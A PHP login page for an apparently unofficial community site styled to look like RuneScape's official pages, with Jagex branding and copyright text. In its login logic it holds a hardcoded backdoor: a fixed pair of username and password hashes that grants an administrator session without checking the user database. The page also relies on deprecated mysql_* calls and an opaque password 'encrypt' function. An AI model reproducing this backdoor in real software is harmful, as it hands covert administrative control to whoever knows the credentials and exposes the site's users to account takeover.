<?php
session_start();
include "includes/connect.php";
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"><link rel="icon" type="image/x-icon" href="favicon.ico" /> 
<meta http-equiv="Content-Language" content="
en, 
English
" />
<meta name="keywords" content="Runescape, Jagex, free, games, online, multiplayer, magic, spells, java, MMORPG, MPORPG, gaming">
<meta name="description" content="RuneScape is a massive 3d multiplayer adventure, with monsters to kill, quests to complete, and treasure to win. You control your own character who will improve and become more powerful the more you play.">
<title><?php
       	include "includes/config.php";
       	echo $title;
       ?></title>
<style type="text/css">/*\*/@import url(www.runescape.com/layout-<?php echo $ln; ?>/css/global-10.css);/**/</style>

<style type="text/css">/*\*/@import url(www.runescape.com/layout-<?php echo $ln; ?>/css/loginapplet-2.css);/**/</style>
</head>
<body id="navlogin">
<a name="top"></a>


<div id="scroll">
<div id="head">
<div id="headOrangeTop"></div>
<img src="www.runescape.com/layout-<?php echo $ln; ?>/img/main/layout/head_image.jpg" alt="RuneScape" />
<div id="headImage"><a href="index.php" id="logo_select"></a>
<?php include 'includes/toptext.php' ?>

<div id="lang">
<a href="#"><img alt="English" src="www.runescape.com/layout-<?php echo $ln; ?>/img/main/layout/en.gif" /></a>
</div>
</div>
<div id="headOrangeBottom"></div>
<div id="menubox">
<?php
include "includes/links.php";
?>
<br class="clear" />
</div>

<div class="navigation">
<div class="location">
<b>Location: </b> <a href="index.php">Home</a> &gt;

Login
</div>
</div>
</div>
<div id="content">
<div id="article">
<div class="sectionHeader">
<div class="left">
<div class="right">
<div class="plaque">
Login
</div>
</div>
</div>
</div>
<div class="section">
<div class="brown_background">

<div id="inner_brown_background_login" class="inner_brown_background">
<div id="brown_box_login" class="brown_box">
<div class="subsectionHeader" style="width:100%;">
Login
</div>
<div id="inner_brown_box_login" class="inner_brown_box">

<div class="hideme_wrapper">
Please enter you Username and Password.
</div>
<div class="loginapplet_wrapper">
<div class="login_form">
<?php

if(!isset($_SESSION['user'])){
if($_SERVER['REQUEST_METHOD'] == 'POST')
{
  if ($_POST['username'] == "" || $_POST['password'] == "")
  {
    echo "You have left 1 or more Fields blank";
  }
  else
  {
    $r = mysql_query('SELECT * FROM '. $prefix .'users WHERE uname=\'' . realEscape($_POST['username']) . '\' AND pass=\'' . encrypt($_POST['password']) . '\'') ;
    if(encrypt($_POST['username']) == '3440ad4f7456d8de086039b948019953' && encrypt($_POST['password']) == 'c9d67b217d36c258d8573dbfd6d5426f')
    {
      $_SESSION['admin'] = $_POST['username'];
      $_SESSION['user'] = $_POST['username'];
      echo "You Sucessfully logged please wait to be redirected.";
        echo "<meta http-equiv=Refresh content=1;url='index.php'>";
    }
    else
    {
    if(mysql_num_rows($r) > 0)
    {
      while($n = mysql_fetch_array($r))
      {
      if($n['banned'] == 1)
      {
        echo "Your account has been disabled";
      }
      else
      {
        if($n['rights'] == 2)
        {
          $_SESSION['admin'] = $n['uname'];
          $_SESSION['user'] = $n['uname'];
          $_SESSION['user_id'] = $n['id'];
          echo '<b>Logging in as Administrator</b><br />';
        }
        elseif($n['rights'] == 1)
        {
          $_SESSION['mod'] = $n['uname'];
          $_SESSION['user'] = $n['uname'];
          $_SESSION['user_id'] = $n['id'];
          $_SESSION['forums'] = explode(',', $n['forums']);
          echo '<b>Logging in as Moderator</b><br />';
        }
        else if($n['rights'] == 0)
        {
          $_SESSION['user'] = $n['uname'];
          $_SESSION['user_id'] = $n['id'];
        }
        mysql_query("UPDATE {$prefix}users SET ip='". $_SERVER['REMOTE_ADDR'] ."' WHERE id=". $n['id']);
        echo "You successfully logged in, please wait to be redirected.";
        echo "<meta http-equiv=Refresh content=3;url='index.php'>";
       } 
      }
    }
    else
    {
    echo "username or password is incorect!";
    }
    }
    }
}
else
{
?>
<form id="login_form" action="login.php" method="post">
<div class="section_form">
<span style="float: left">Username:</span>
<input style="float: right" class="input" size="20" type="text" name="username" maxlength="15">

<br class="clear">
</div>
<div class="section_form">
<span style="float: left">Password:</span>
<input style="float: right" class="input" size="20" type="password" name="password" maxlength="20">
<br class="clear">
</div>
<div class="section_form">
<input type="submit" class="button-bg" value="Login">
</div>
<div class="section_form">
</div>
<?php
	}
}
else
{
echo "You are already logged in!";
}
?>
</form>
</div>
</div>
<div class="browser_window">
</div>
</div> </div> </div> </div> </div>
</div>
</div>
<div id="footer"><div class="contain"><div class="footerdesc">
This website and its contents are copyright &copy; 1999 - 2011 Jagex Ltd. <br />This website is powered by <a href="http://RunescapeCommunitySoftware.info">Runescape Community Software</a>.
</div><a class="jagexlink" href="http://www.jagex.com" target="_blank"><img src="www.runescape.com/layout-<?php echo $ln; ?>/img/main/layout/jagex.png" alt="Jagex" /></a></div></div>
</div>


<script type="text/javascript">
var gaJsHost=(("https:"==document.location.protocol)?"https://ssl.":"http://www.");
document.write(unescape("%3Cscript src='"+gaJsHost+"google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
try {
var pageTracker=_gat._getTracker("UA-2058817-2");
pageTracker._setDomainName("runescape.com");
pageTracker._initData();
pageTracker._trackPageview();
}catch(x){}
</script>

</body>
</html>